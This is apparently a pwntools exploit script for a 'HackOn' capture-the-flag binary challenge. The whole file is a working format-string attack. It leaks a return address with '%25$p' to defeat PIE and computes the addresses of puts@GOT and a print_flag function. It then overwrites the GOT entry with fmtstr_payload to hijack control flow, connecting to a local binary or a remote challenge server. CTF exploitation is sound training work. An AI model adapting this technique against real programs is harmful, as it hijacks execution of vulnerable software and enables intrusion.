#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

LOCAL = True
if args.REMOTE:
    LOCAL = False

def conn():
    if LOCAL:
        return process('./chall')
    else:
        return remote('0.cloud.chals.io', 11359)

def main():
    p = conn()

    # Stage 1: Leak PIE base via return address at offset 25
    p.recvuntil(b'plin:')
    p.sendline(b'%25$p')

    # Output format: "\n0xXXXXX\nplon:\n"
    data = p.recvuntil(b'plon:')
    log.info(f"Received: {data}")
    # Extract the hex address
    leak = data.split(b'\n')[1].strip()
    log.info(f"Leak: {leak}")
    ret_addr = int(leak, 16)
    pie_base = ret_addr - 0x1371

    print_flag = pie_base + 0x11a9
    puts_got = pie_base + 0x3468

    log.info(f"Leaked return addr: {hex(ret_addr)}")
    log.info(f"PIE base: {hex(pie_base)}")
    log.info(f"print_flag: {hex(print_flag)}")
    log.info(f"puts@GOT: {hex(puts_got)}")

    # Stage 2: Overwrite puts@GOT with print_flag using fmtstr_payload
    # Buffer starts at offset 6
    payload = fmtstr_payload(6, {puts_got: print_flag})

    log.info(f"Payload length: {len(payload)}")

    # Check if payload fits in 0x80 byte buffer
    if len(payload) > 0x7f:  # -1 for newline
        log.error(f"Payload too long: {len(payload)} > 127")
        return

    p.sendline(payload)

    # Receive everything
    log.info("Sent payload, waiting for flag...")
    try:
        output = p.recvall(timeout=5)
        log.info(f"Output: {output}")
        # Look for flag pattern
        import re
        flags = re.findall(rb'HackOn\{[^}]+\}', output)
        if flags:
            log.success(f"Flag: {flags[0].decode()}")
        else:
            log.info("No flag found in output, trying interactive...")
            p.interactive()
    except:
        p.interactive()

if __name__ == '__main__':
    main()
